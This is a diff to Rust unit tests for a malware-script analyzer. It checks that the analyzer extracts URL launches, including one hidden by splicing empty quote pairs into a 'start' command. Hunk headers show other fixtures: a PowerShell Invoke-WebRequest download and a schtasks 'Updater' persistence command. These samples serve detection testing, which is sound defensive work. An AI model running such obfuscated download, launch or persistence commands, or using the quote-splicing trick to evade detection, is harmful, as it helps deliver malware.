@@ -950,8 +950,28 @@ sh.Run("powershell -Command Invoke-WebRequest https://direct-js-const.example/p"
         let report = analyze(script, &AnalyzeConfig::default());
         assert!(
             report.traits.iter().any(|t| matches!(t,
-                Trait::Download { src, .. } if src == "https://opened.example/doc.pdf")),
-            "start-quoted URL not extracted: {:?}",
+                Trait::UrlLaunch { url, .. } if url == "https://opened.example/doc.pdf")),
+            "start-quoted URL launch not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_quote_spliced_url_launch_collapses_empty_quote_pairs() {
+        let script =
+            br#"start "" "https://raw.githubuserc""o""ntent.c""o""m/example/repo/main/DOC.zip""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(t,
+                Trait::UrlLaunch { url, .. }
+                    if url == "https://raw.githubusercontent.com/example/repo/main/DOC.zip")),
+            "quote-spliced start URL launch not normalized: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(t,
+                Trait::UrlLaunch { url, .. } if url == "https://raw.githubuserc")),
+            "quote-spliced start URL launch was truncated: {:?}",
             report.traits
         );
     }
@@ -2290,8 +2310,8 @@ schtasks /create /tn "Updater" /tr "cmd /V:ON /c set U=https://schtasks.example/
         let report = analyze(script, &AnalyzeConfig::default());
         assert!(
             report.traits.iter().any(|t| matches!(t,
-                Trait::Download { src, .. } if src == "https://browser.example/x")),
-            "start-browser URL not extracted: {:?}",
+                Trait::UrlLaunch { url, .. } if url == "https://browser.example/x")),
+            "start-browser URL launch not extracted: {:?}",
             report.traits
         );
     }
